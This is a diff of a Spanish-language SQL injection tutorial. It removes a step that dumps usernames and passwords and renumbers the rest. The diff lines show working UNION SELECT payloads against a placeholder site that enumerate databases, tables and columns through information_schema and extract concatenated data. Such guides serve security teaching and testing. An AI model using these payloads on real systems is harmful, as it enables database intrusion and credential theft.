@@ -34,11 +34,10 @@
 - [🛠️ Paso 1️⃣ Detectar vulnerabilidad](#paso1)
 - [🛠️ Paso 2️⃣ Identificar número de columnas](#paso2)
 - [🛠️ Paso 3️⃣ Usar UNION SELECT](#paso3)
-- [🛠️ Paso 4️⃣ Extraer datos reales](#paso4)
-- [🛠️ Paso 5️⃣ Listar bases de datos](#paso5)
-- [🛠️ Paso 6️⃣ Listar nombres de tablas](#paso6)
-- [🛠️ Paso 7️⃣ Listar columnas](#paso7)
-- [🛠️ Paso 8️⃣ Mostrar datos concatenados](#paso8)
+- [🛠️ Paso 4️⃣ Listar bases de datos](#paso5)
+- [🛠️ Paso 5️⃣ Listar nombres de tablas](#paso6)
+- [🛠️ Paso 6️⃣ Listar columnas](#paso7)
+- [🛠️ Paso 7️⃣ Mostrar datos concatenados](#paso8)
 - [✅ Notas importantes](#notasss)
 
 ### 5. Ataques específicos
@@ -304,18 +303,9 @@ http://ejemplo.com/product.php?id=1 UNION SELECT 1,2,3-- -
 Si ves 1, 2, 3 en la página, la inyección funciona.
 
 ---
-<a name="paso4"></a>
-## Paso 4️⃣ Extraer datos reales
-
-Ejemplo:
-
-```bash
-http://ejemplo.com/product.php?id=1 UNION SELECT username,password,3 FROM users-- -
-```
-
 ---
 <a name="paso5"></a>
-## Paso 5️⃣ Listar bases de datos
+## Paso 4️⃣ Listar bases de datos
 
 ```bash
 http://ejemplo.com/product.php?id=1 UNION SELECT 1,schema_name,3,4,5 FROM information_schema.schemata-- -
@@ -329,7 +319,7 @@ http://ejemplo.com/product.php?id=1 UNION SELECT 1,schema_name,3,4,5 FROM inform
 
 ---
 <a name="paso6"></a>
-## Paso 6️⃣ Listar nombres de tablas
+## Paso 5️⃣ Listar nombres de tablas
 
 ```bash
 http://ejemplo.com/product.php?id=1 UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables WHERE table_schema="<NOMBRE_BASE_DATOS>"-- -
@@ -337,7 +327,7 @@ http://ejemplo.com/product.php?id=1 UNION SELECT 1,table_name,3,4,5 FROM informa
 
 ---
 <a name="paso7"></a>
-## Paso 7️⃣ Listar columnas
+## Paso 6️⃣ Listar columnas
 
 ```bash
 http://ejemplo.com/product.php?id=1 UNION SELECT 1,column_name,3,4,5 FROM information_schema.columns WHERE table_schema="<NOMBRE_BASE_DATOS>" AND table_name="<NOMBRE_TABLA>"-- -
@@ -345,7 +335,7 @@ http://ejemplo.com/product.php?id=1 UNION SELECT 1,column_name,3,4,5 FROM inform
 
 ---
 <a name="paso8"></a>
-## Paso 8️⃣ Mostrar datos concatenados
+## Paso 7️⃣ Mostrar datos concatenados
 
 ```bash
 http://ejemplo.com/product.php?id=1 UNION SELECT 1,CONCAT(<COLUMNA1>,0x3a,<COLUMNA2>),3,4,5 FROM <NOMBRE_BASE_DATOS>.<NOMBRE_TABLA>-- -
